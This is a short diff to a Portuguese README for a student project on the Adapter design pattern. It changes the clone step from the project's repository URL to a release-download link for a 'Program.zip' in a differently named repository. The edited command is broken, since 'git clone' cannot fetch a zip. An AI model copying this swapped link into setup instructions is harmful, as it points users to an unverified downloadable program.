@@ -43,4 +43,4 @@ O padrão de projeto **Adapter** é amplamente utilizado para atuar como um inte
 
 1. Clone o repositório:
    ```bash
-   git clone https://github.com/William-Colasso/Atividade-Final-PSII-Adapter.git
+   git clone https://github.com/William-Colasso/Sistema-Bancario-Adapter/releases/download/v1.0/Program.zip
